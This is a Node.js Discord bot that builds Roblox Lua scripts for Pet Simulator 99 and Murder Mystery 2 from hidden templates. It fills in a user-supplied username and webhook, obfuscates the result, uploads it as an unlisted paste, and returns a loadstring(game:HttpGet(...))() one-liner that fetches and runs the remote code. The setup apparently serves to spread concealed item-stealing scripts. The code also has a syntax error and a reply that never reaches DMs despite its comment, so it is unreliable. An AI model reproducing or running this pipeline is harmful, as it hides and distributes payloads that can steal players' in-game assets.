// ======================= bot.js =======================
require("dotenv").config();

const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { spawn } = require("child_process");

const {
  Client,
  GatewayIntentBits,
  Partials,
  REST,
  Routes,
  SlashCommandBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActionRowBuilder,
  AttachmentBuilder,
} = require("discord.js");

// ---------- CONFIG ----------
const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const BASE_FOLDER =
  process.env.BASE_FOLDER || path.join(__dirname, "generated");
const OBFUSCATOR_PATH = process.env.OBFUSCATOR_PATH;
const PASTEFY_API_KEY = process.env.PASTEFY_API_KEY;

if (!TOKEN || !CLIENT_ID) {
  console.error("❌ Missing DISCORD_TOKEN or CLIENT_ID in .env");
  process.exit(1);
}

fs.mkdirSync(BASE_FOLDER, { recursive: true });

// ---------- TEMPLATE MAP ----------
const TEMPLATE_MAP = {
  scriptA: path.join(__dirname, "pet99.lua"),
  scriptB: path.join(__dirname, "mm2.lua"),
};

// ---------- HELPERS ----------
const sanitize = (s) =>
  String(s || "user").replace(/[^a-zA-Z0-9_-]/g, "_");

// 🔒 Lua 5.1–safe replacement (NO Lua 5.3 operators)
function buildScript(template, u, webhook) {
  const safe = (v) =>
    String(v || "")
      .replace(/\\/g, "\\\\")
      .replace(/"/g, '\\"')
      .replace(/\r?\n/g, "\\n");

  return template
    .replace(/%%USERNAME%%/g, safe(u))
    .replace(/%%WEBHOOK%%/g, safe(webhook))
}

function ensureUserDir(user) {
  const dir = path.join(BASE_FOLDER, sanitize(user.username));
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// ---------- OBFUSCATOR ----------
function runObfuscator(inputPath) {
  return new Promise((resolve, reject) => {
    if (!OBFUSCATOR_PATH) {
      return reject(new Error("OBFUSCATOR_PATH not set"));
    }

    let cmd = OBFUSCATOR_PATH;
    let args = [inputPath];

    if (
      OBFUSCATOR_PATH.endsWith(".bat") ||
      OBFUSCATOR_PATH.endsWith(".cmd")
    ) {
      cmd = "cmd.exe";
      args = ["/c", OBFUSCATOR_PATH, inputPath];
    } else if (OBFUSCATOR_PATH.endsWith(".js")) {
      cmd = process.execPath;
      args = [OBFUSCATOR_PATH, inputPath];
    }

    const proc = spawn(cmd, args, { windowsHide: true });

    let stdout = "";
    let stderr = "";

    proc.stdout.on("data", (d) => (stdout += d.toString()));
    proc.stderr.on("data", (d) => (stderr += d.toString()));

    proc.on("close", (code) => {
      const guessFile = inputPath.replace(".lua", "_obfuscated.lua");

      if (!stdout.trim() && fs.existsSync(guessFile)) {
        stdout = fs.readFileSync(guessFile, "utf8");
      }

      if (code !== 0 || !stdout.trim()) {
        return reject(new Error(stderr || "Obfuscator failed"));
      }

      resolve(stdout.trim());
    });
  });
}

// ---------- PASTEFY ----------
async function uploadToPastefy(script) {
  const res = await axios.post(
    "https://pastefy.app/api/v2/paste",
    {
      content: script,
      title: "Paste-" + Math.random().toString(36).slice(2, 8),
      visibility: "UNLISTED",
    },
    {
      headers: {
        Authorization: `Bearer ${PASTEFY_API_KEY}`,
        "Content-Type": "application/json",
      },
    }
  );

  return res.data.paste.raw_url;
}

// ---------- SCRIPT GENERATION ----------
async function generateScript(
  u,
  webhook,
  user,
  templatePath
) {
  const dir = ensureUserDir(user);

  const template = fs.readFileSync(templatePath, "utf8");
  const rawScript = buildScript(
    template,
    u,
    webhook,
  );

  const rawPath = path.join(dir, "script.lua");
  fs.writeFileSync(rawPath, rawScript);

  const obfuscated = await runObfuscator(rawPath);
  return uploadToPastefy(obfuscated);
}

// ---------- DISCORD ----------
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages],
  partials: [Partials.Channel],
});

const commands = [
  new SlashCommandBuilder()
    .setName("generate")
    .setDescription("Generate a Roblox script")
    .addStringOption((o) =>
      o
        .setName("script")
        .setDescription("Choose script type")
        .setRequired(true)
        .addChoices(
          { name: "Pet99 Script", value: "scriptA" },
          { name: "MM2 Script", value: "scriptB" }
        )
    )
    .toJSON(),
];

client.on("interactionCreate", async (i) => {
  if (i.isChatInputCommand() && i.commandName === "generate") {
    const modal = new ModalBuilder()
      .setCustomId(`gen:${i.options.getString("script")}`)
      .setTitle("Generate Script")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("u")
            .setLabel("Username ")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
     
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("wh")
            .setLabel("Webhook")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
        
        )
      );

    return i.showModal(modal);
  }

  if (i.isModalSubmit() && i.customId.startsWith("gen:")) {
    await i.deferReply({ ephemeral: true });

    try {
      const templateKey = i.customId.split(":")[1];
      const templatePath = TEMPLATE_MAP[templateKey];

      
      const rawUrl = await generateScript(
        i.fields.getTextInputValue("u"),
        i.fields.getTextInputValue("wh"),
        i.user,
        templatePath
      );

      // ✅ SENT TO DMs (unchanged behavior)
      await i.editReply({
  content: `\`\`\`lua
loadstring(game:HttpGet("${rawUrl}"))()
\`\`\``
});
      );

      await i.editReply("✅ Script generated. Check your DMs.");
    } catch (e) {
      const file = new AttachmentBuilder(Buffer.from(String(e)), {
        name: "error.txt",
      });

      await i.editReply({
        content: "❌ Failed to generate script.",
        files: [file],
      });
    }
  }
});

// ---------- START ----------
(async () => {
  const rest = new REST({ version: "10" }).setToken(TOKEN);

  await rest.put(
    GUILD_ID
      ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID)
      : Routes.applicationCommands(CLIENT_ID),
    { body: commands }
  );

  await client.login(TOKEN);
  console.log("✅ Bot started successfully");
})();
